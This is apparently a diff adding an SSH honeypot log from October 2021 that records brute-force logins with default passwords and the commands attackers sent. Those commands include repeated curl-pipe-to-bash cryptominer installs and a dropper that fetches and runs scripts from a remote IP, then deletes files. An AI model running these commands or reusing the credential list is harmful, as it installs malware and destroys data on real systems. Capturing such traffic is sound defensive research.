@@ -1,0 +1,945 @@
+2021-10-29 12:42:42,058 - root - INFO - New connection from: 221.181.185.159
+2021-10-29 12:42:43,741 - paramiko.transport - INFO - Connected (version 2.0, client PUTTY)
+2021-10-29 13:37:03,763 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:37:03,768 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:37:08,890 - root - INFO - new client credentials (209.141.60.103): username: root, password: 0
+2021-10-29 13:37:08,890 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:37:09,051 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:37:09,052 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:37:09,052 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:37:09,052 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:37:09,052 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:37:09,224 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:37:09,260 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:37:19,052 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:37:55,014 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:37:55,018 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:37:56,449 - root - INFO - new client credentials (209.141.60.103): username: root, password: 123
+2021-10-29 13:37:56,450 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:37:56,728 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:37:56,728 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:37:56,728 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:37:56,728 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:37:56,728 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:37:56,996 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:37:56,997 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:38:06,728 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:38:48,386 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:38:48,388 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:38:49,168 - root - INFO - new client credentials (209.141.60.103): username: root, password: 12345
+2021-10-29 13:38:49,168 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:38:49,323 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:38:49,324 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:38:49,324 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:38:49,324 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:38:49,324 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:38:49,472 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:38:49,473 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:38:59,324 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:39:03,443 - root - INFO - New connection from: 130.209.157.48
+2021-10-29 13:39:03,445 - paramiko.transport - INFO - Connected (version 2.0, client OpenSSH_8.1)
+2021-10-29 13:39:04,430 - root - INFO - New connection from: 68.183.180.46
+2021-10-29 13:39:04,617 - paramiko.transport - ERROR - Exception: Error reading SSH protocol banner
+2021-10-29 13:39:04,622 - paramiko.transport - ERROR - Traceback (most recent call last):
+2021-10-29 13:39:04,622 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/transport.py", line 2211, in _check_banner
+2021-10-29 13:39:04,622 - paramiko.transport - ERROR -     buf = self.packetizer.readline(timeout)
+2021-10-29 13:39:04,622 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/packet.py", line 380, in readline
+2021-10-29 13:39:04,622 - paramiko.transport - ERROR -     buf += self._read_timeout(timeout)
+2021-10-29 13:39:04,622 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/packet.py", line 609, in _read_timeout
+2021-10-29 13:39:04,622 - paramiko.transport - ERROR -     raise EOFError()
+2021-10-29 13:39:04,622 - paramiko.transport - ERROR - EOFError
+2021-10-29 13:39:04,622 - paramiko.transport - ERROR - 
+2021-10-29 13:39:04,622 - paramiko.transport - ERROR - During handling of the above exception, another exception occurred:
+2021-10-29 13:39:04,622 - paramiko.transport - ERROR - 
+2021-10-29 13:39:04,622 - paramiko.transport - ERROR - Traceback (most recent call last):
+2021-10-29 13:39:04,622 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/transport.py", line 2039, in run
+2021-10-29 13:39:04,622 - paramiko.transport - ERROR -     self._check_banner()
+2021-10-29 13:39:04,622 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/transport.py", line 2215, in _check_banner
+2021-10-29 13:39:04,622 - paramiko.transport - ERROR -     raise SSHException(
+2021-10-29 13:39:04,622 - paramiko.transport - ERROR - paramiko.ssh_exception.SSHException: Error reading SSH protocol banner
+2021-10-29 13:39:04,623 - paramiko.transport - ERROR - 
+2021-10-29 13:39:28,948 - root - INFO - New connection from: 117.68.2.55
+2021-10-29 13:39:29,221 - paramiko.transport - ERROR - Exception: Error reading SSH protocol banner
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR - Traceback (most recent call last):
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/transport.py", line 2211, in _check_banner
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR -     buf = self.packetizer.readline(timeout)
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/packet.py", line 380, in readline
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR -     buf += self._read_timeout(timeout)
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/packet.py", line 609, in _read_timeout
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR -     raise EOFError()
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR - EOFError
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR - 
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR - During handling of the above exception, another exception occurred:
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR - 
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR - Traceback (most recent call last):
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/transport.py", line 2039, in run
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR -     self._check_banner()
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/transport.py", line 2215, in _check_banner
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR -     raise SSHException(
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR - paramiko.ssh_exception.SSHException: Error reading SSH protocol banner
+2021-10-29 13:39:29,222 - paramiko.transport - ERROR - 
+2021-10-29 13:39:40,485 - root - INFO - New connection from: 130.209.157.48
+2021-10-29 13:39:40,486 - paramiko.transport - INFO - Connected (version 2.0, client OpenSSH_8.1)
+2021-10-29 13:39:40,659 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:39:40,662 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:39:41,415 - root - INFO - New connection from: 68.183.180.46
+2021-10-29 13:39:41,416 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:39:41,880 - root - INFO - new client credentials (209.141.60.103): username: root, password: 123456
+2021-10-29 13:39:41,880 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:39:42,144 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:39:42,144 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:39:42,144 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:39:42,144 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:39:42,144 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:39:42,385 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:39:42,385 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:39:42,415 - root - INFO - new client credentials (68.183.180.46): username: root, password: root
+2021-10-29 13:39:42,416 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:39:42,617 - root - INFO - client called check_channel_request (68.183.180.46): session
+2021-10-29 13:39:42,617 - root - INFO - Client mac (68.183.180.46): hmac-sha1
+2021-10-29 13:39:42,617 - root - INFO - Client compression (68.183.180.46): none
+2021-10-29 13:39:42,617 - root - INFO - Client SSH version (68.183.180.46): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:39:42,617 - root - INFO - Client SSH cipher (68.183.180.46): aes128-ctr
+2021-10-29 13:39:42,820 - root - INFO - New URL detected (68.183.180.46): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:39:42,821 - root - INFO - client sent command via check_channel_exec_request (68.183.180.46): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 44XKLDbSztdXqao2Rs2EFFLvdjsbRwYrP1FkqdqB91v1PohHdSSTjyeKQ4t6UMFXNdYpxkNhwpi9xTRmEsk6PeUSLHCfeLR'
+2021-10-29 13:39:45,777 - paramiko.transport - INFO - Auth rejected (none).
+2021-10-29 13:39:45,777 - root - INFO - client called get_allowed_auths (130.209.157.48) with username ubuntu
+2021-10-29 13:39:49,046 - root - INFO - new client credentials (130.209.157.48): username: ubuntu, password: root
+2021-10-29 13:39:49,046 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:39:49,071 - root - INFO - client called check_channel_request (130.209.157.48): session
+2021-10-29 13:39:49,071 - root - INFO - Client mac (130.209.157.48): hmac-sha2-256-etm@openssh.com
+2021-10-29 13:39:49,071 - root - INFO - Client compression (130.209.157.48): none
+2021-10-29 13:39:49,071 - root - INFO - Client SSH version (130.209.157.48): SSH-2.0-OpenSSH_8.1
+2021-10-29 13:39:49,071 - root - INFO - Client SSH cipher (130.209.157.48): aes128-ctr
+2021-10-29 13:39:52,144 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:39:52,618 - root - INFO - ** Client (68.183.180.46): never asked for a shell
+2021-10-29 13:39:55,273 - root - INFO - Command received (130.209.157.48): ls
+2021-10-29 13:39:55,273 - root - INFO - Response from honeypot (130.209.157.48): 
+2021-10-29 13:40:05,373 - paramiko.transport - INFO - Disconnect (code 11): disconnected by user
+2021-10-29 13:40:16,827 - root - INFO - New connection from: 68.183.180.46
+2021-10-29 13:40:16,828 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:40:17,774 - root - INFO - new client credentials (68.183.180.46): username: root, password: admin123
+2021-10-29 13:40:17,774 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:40:17,963 - root - INFO - client called check_channel_request (68.183.180.46): session
+2021-10-29 13:40:17,963 - root - INFO - Client mac (68.183.180.46): hmac-sha1
+2021-10-29 13:40:17,963 - root - INFO - Client compression (68.183.180.46): none
+2021-10-29 13:40:17,963 - root - INFO - Client SSH version (68.183.180.46): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:40:17,963 - root - INFO - Client SSH cipher (68.183.180.46): aes128-ctr
+2021-10-29 13:40:18,147 - root - INFO - New URL detected (68.183.180.46): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:40:18,148 - root - INFO - client sent command via check_channel_exec_request (68.183.180.46): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 44XKLDbSztdXqao2Rs2EFFLvdjsbRwYrP1FkqdqB91v1PohHdSSTjyeKQ4t6UMFXNdYpxkNhwpi9xTRmEsk6PeUSLHCfeLR'
+2021-10-29 13:40:27,964 - root - INFO - ** Client (68.183.180.46): never asked for a shell
+2021-10-29 13:40:37,520 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:40:37,531 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:40:38,340 - root - INFO - new client credentials (209.141.60.103): username: root, password: 12345678
+2021-10-29 13:40:38,341 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:40:38,491 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:40:38,491 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:40:38,491 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:40:38,491 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:40:38,491 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:40:39,051 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:40:39,051 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:40:48,491 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:40:50,960 - root - INFO - New connection from: 68.183.180.46
+2021-10-29 13:40:50,962 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:40:51,966 - root - INFO - new client credentials (68.183.180.46): username: root, password: eve
+2021-10-29 13:40:51,966 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:40:52,163 - root - INFO - client called check_channel_request (68.183.180.46): session
+2021-10-29 13:40:52,163 - root - INFO - Client mac (68.183.180.46): hmac-sha1
+2021-10-29 13:40:52,163 - root - INFO - Client compression (68.183.180.46): none
+2021-10-29 13:40:52,164 - root - INFO - Client SSH version (68.183.180.46): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:40:52,164 - root - INFO - Client SSH cipher (68.183.180.46): aes128-ctr
+2021-10-29 13:40:52,362 - root - INFO - New URL detected (68.183.180.46): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:40:52,362 - root - INFO - client sent command via check_channel_exec_request (68.183.180.46): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 44XKLDbSztdXqao2Rs2EFFLvdjsbRwYrP1FkqdqB91v1PohHdSSTjyeKQ4t6UMFXNdYpxkNhwpi9xTRmEsk6PeUSLHCfeLR'
+2021-10-29 13:41:02,164 - root - INFO - ** Client (68.183.180.46): never asked for a shell
+2021-10-29 13:41:26,350 - root - INFO - New connection from: 68.183.180.46
+2021-10-29 13:41:26,352 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:41:27,253 - root - INFO - new client credentials (68.183.180.46): username: ossuser, password: Changeme_123
+2021-10-29 13:41:27,253 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:41:27,430 - root - INFO - client called check_channel_request (68.183.180.46): session
+2021-10-29 13:41:27,430 - root - INFO - Client mac (68.183.180.46): hmac-sha1
+2021-10-29 13:41:27,430 - root - INFO - Client compression (68.183.180.46): none
+2021-10-29 13:41:27,430 - root - INFO - Client SSH version (68.183.180.46): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:41:27,430 - root - INFO - Client SSH cipher (68.183.180.46): aes128-ctr
+2021-10-29 13:41:27,606 - root - INFO - New URL detected (68.183.180.46): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:41:27,607 - root - INFO - client sent command via check_channel_exec_request (68.183.180.46): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 44XKLDbSztdXqao2Rs2EFFLvdjsbRwYrP1FkqdqB91v1PohHdSSTjyeKQ4t6UMFXNdYpxkNhwpi9xTRmEsk6PeUSLHCfeLR'
+2021-10-29 13:41:33,526 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:41:33,529 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:41:35,690 - root - INFO - new client credentials (209.141.60.103): username: root, password: 1234567890
+2021-10-29 13:41:35,690 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:41:36,245 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:41:36,246 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:41:36,246 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:41:36,246 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:41:36,246 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:41:36,398 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:41:36,399 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:41:37,431 - root - INFO - ** Client (68.183.180.46): never asked for a shell
+2021-10-29 13:41:46,246 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:41:50,790 - root - INFO - New connection from: 5.189.168.79
+2021-10-29 13:41:50,793 - root - INFO - New connection from: 5.189.168.79
+2021-10-29 13:41:50,794 - root - INFO - New connection from: 5.189.168.79
+2021-10-29 13:41:50,795 - root - INFO - New connection from: 5.189.168.79
+2021-10-29 13:41:50,796 - root - INFO - New connection from: 5.189.168.79
+2021-10-29 13:41:50,797 - root - INFO - New connection from: 5.189.168.79
+2021-10-29 13:41:52,008 - paramiko.transport - INFO - Connected (version 2.0, client Go)
+2021-10-29 13:41:52,037 - paramiko.transport - INFO - Connected (version 2.0, client Go)
+2021-10-29 13:41:52,051 - paramiko.transport - INFO - Connected (version 2.0, client Go)
+2021-10-29 13:41:52,086 - paramiko.transport - INFO - Connected (version 2.0, client Go)
+2021-10-29 13:41:52,086 - paramiko.transport - INFO - Connected (version 2.0, client Go)
+2021-10-29 13:41:52,832 - paramiko.transport - INFO - Connected (version 2.0, client Go)
+2021-10-29 13:41:54,451 - paramiko.transport - INFO - Auth rejected (none).
+2021-10-29 13:41:54,451 - root - INFO - client called get_allowed_auths (5.189.168.79) with username ubnt
+2021-10-29 13:41:54,491 - paramiko.transport - INFO - Auth rejected (none).
+2021-10-29 13:41:54,492 - root - INFO - client called get_allowed_auths (5.189.168.79) with username root
+2021-10-29 13:41:54,847 - paramiko.transport - INFO - Auth rejected (none).
+2021-10-29 13:41:54,847 - root - INFO - client called get_allowed_auths (5.189.168.79) with username guest
+2021-10-29 13:41:55,570 - root - INFO - new client credentials (5.189.168.79): username: ubnt, password: ubnt
+2021-10-29 13:41:55,570 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:41:55,649 - root - INFO - new client credentials (5.189.168.79): username: root, password: root
+2021-10-29 13:41:55,649 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:41:56,111 - paramiko.transport - INFO - Auth rejected (none).
+2021-10-29 13:41:56,111 - root - INFO - client called get_allowed_auths (5.189.168.79) with username admin
+2021-10-29 13:41:56,172 - root - INFO - new client credentials (5.189.168.79): username: guest, password: guest
+2021-10-29 13:41:56,172 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:41:56,701 - root - INFO - client called check_channel_request (5.189.168.79): session
+2021-10-29 13:41:56,701 - root - INFO - Client mac (5.189.168.79): hmac-sha2-256-etm@openssh.com
+2021-10-29 13:41:56,701 - root - INFO - Client compression (5.189.168.79): none
+2021-10-29 13:41:56,701 - root - INFO - Client SSH version (5.189.168.79): SSH-2.0-Go
+2021-10-29 13:41:56,701 - root - INFO - Client SSH cipher (5.189.168.79): aes128-ctr
+2021-10-29 13:41:57,349 - paramiko.transport - INFO - Auth rejected (none).
+2021-10-29 13:41:57,349 - root - INFO - client called get_allowed_auths (5.189.168.79) with username support
+2021-10-29 13:41:57,531 - root - INFO - new client credentials (5.189.168.79): username: admin, password: admin
+2021-10-29 13:41:57,531 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:41:57,799 - paramiko.transport - INFO - Auth rejected (none).
+2021-10-29 13:41:57,799 - root - INFO - client called get_allowed_auths (5.189.168.79) with username root
+2021-10-29 13:41:58,511 - root - INFO - New connection from: 68.183.180.46
+2021-10-29 13:41:58,512 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:41:58,556 - root - INFO - new client credentials (5.189.168.79): username: support, password: support
+2021-10-29 13:41:58,556 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:41:59,197 - root - INFO - new client credentials (5.189.168.79): username: root, password: vizxv
+2021-10-29 13:41:59,197 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:41:59,470 - root - INFO - new client credentials (68.183.180.46): username: root, password: 1111111
+2021-10-29 13:41:59,470 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:41:59,659 - root - INFO - client called check_channel_request (68.183.180.46): session
+2021-10-29 13:41:59,660 - root - INFO - Client mac (68.183.180.46): hmac-sha1
+2021-10-29 13:41:59,660 - root - INFO - Client compression (68.183.180.46): none
+2021-10-29 13:41:59,660 - root - INFO - Client SSH version (68.183.180.46): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:41:59,660 - root - INFO - Client SSH cipher (68.183.180.46): aes128-ctr
+2021-10-29 13:41:59,850 - root - INFO - New URL detected (68.183.180.46): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:41:59,850 - root - INFO - client sent command via check_channel_exec_request (68.183.180.46): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 44XKLDbSztdXqao2Rs2EFFLvdjsbRwYrP1FkqdqB91v1PohHdSSTjyeKQ4t6UMFXNdYpxkNhwpi9xTRmEsk6PeUSLHCfeLR'
+2021-10-29 13:42:00,478 - root - INFO - New URL detected (5.189.168.79): http://192.3.185.234/run.sh
+2021-10-29 13:42:00,478 - root - INFO - New URL detected (5.189.168.79): http://192.3.185.234/run.sh
+2021-10-29 13:42:00,478 - root - INFO - New IP-based URL detected (5.189.168.79): 192.3.185.234/run.sh;
+2021-10-29 13:42:00,478 - root - INFO - New IP-based URL detected (5.189.168.79): 192.3.185.234/run.sh;
+2021-10-29 13:42:00,479 - root - INFO - client sent command via check_channel_exec_request (5.189.168.79): b'sudo su;cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://192.3.185.234/run.sh; curl -O http://192.3.185.234/run.sh; chmod 777 run.sh; sh run.sh; tftp 192.3.185.234 -c get run.sh; chmod 777 run.sh; sh run.sh; tftp -r run2.sh -g 192.3.185.234; chmod 777 run2.sh; sh run2.sh; ftpget -v -u anonymous -p anonymous -P 21 192.3.185.234 run1.sh run1.sh; sh run1.sh; rm -rf run.sh run.sh run2.sh run1.sh; rm -rf *'
+2021-10-29 13:42:06,702 - root - INFO - ** Client (5.189.168.79): never asked for a shell
+2021-10-29 13:42:09,660 - root - INFO - ** Client (68.183.180.46): never asked for a shell
+2021-10-29 13:42:22,917 - root - INFO - New connection from: 159.223.24.19
+2021-10-29 13:42:22,943 - paramiko.transport - ERROR - Exception: Error reading SSH protocol banner
+2021-10-29 13:42:22,943 - paramiko.transport - ERROR - Traceback (most recent call last):
+2021-10-29 13:42:22,943 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/transport.py", line 2211, in _check_banner
+2021-10-29 13:42:22,943 - paramiko.transport - ERROR -     buf = self.packetizer.readline(timeout)
+2021-10-29 13:42:22,943 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/packet.py", line 380, in readline
+2021-10-29 13:42:22,944 - paramiko.transport - ERROR -     buf += self._read_timeout(timeout)
+2021-10-29 13:42:22,944 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/packet.py", line 609, in _read_timeout
+2021-10-29 13:42:22,944 - paramiko.transport - ERROR -     raise EOFError()
+2021-10-29 13:42:22,944 - paramiko.transport - ERROR - EOFError
+2021-10-29 13:42:22,944 - paramiko.transport - ERROR - 
+2021-10-29 13:42:22,944 - paramiko.transport - ERROR - During handling of the above exception, another exception occurred:
+2021-10-29 13:42:22,944 - paramiko.transport - ERROR - 
+2021-10-29 13:42:22,944 - paramiko.transport - ERROR - Traceback (most recent call last):
+2021-10-29 13:42:22,944 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/transport.py", line 2039, in run
+2021-10-29 13:42:22,944 - paramiko.transport - ERROR -     self._check_banner()
+2021-10-29 13:42:22,944 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/transport.py", line 2215, in _check_banner
+2021-10-29 13:42:22,944 - paramiko.transport - ERROR -     raise SSHException(
+2021-10-29 13:42:22,944 - paramiko.transport - ERROR - paramiko.ssh_exception.SSHException: Error reading SSH protocol banner
+2021-10-29 13:42:22,944 - paramiko.transport - ERROR - 
+2021-10-29 13:42:25,954 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:42:25,959 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:42:26,782 - root - INFO - new client credentials (209.141.60.103): username: root, password: 123456789
+2021-10-29 13:42:26,782 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:42:26,951 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:42:26,951 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:42:26,951 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:42:26,952 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:42:26,952 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:42:27,114 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:42:27,115 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:42:32,332 - root - INFO - New connection from: 68.183.180.46
+2021-10-29 13:42:32,332 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:42:33,257 - root - INFO - new client credentials (68.183.180.46): username: root, password: 0
+2021-10-29 13:42:33,257 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:42:33,444 - root - INFO - client called check_channel_request (68.183.180.46): session
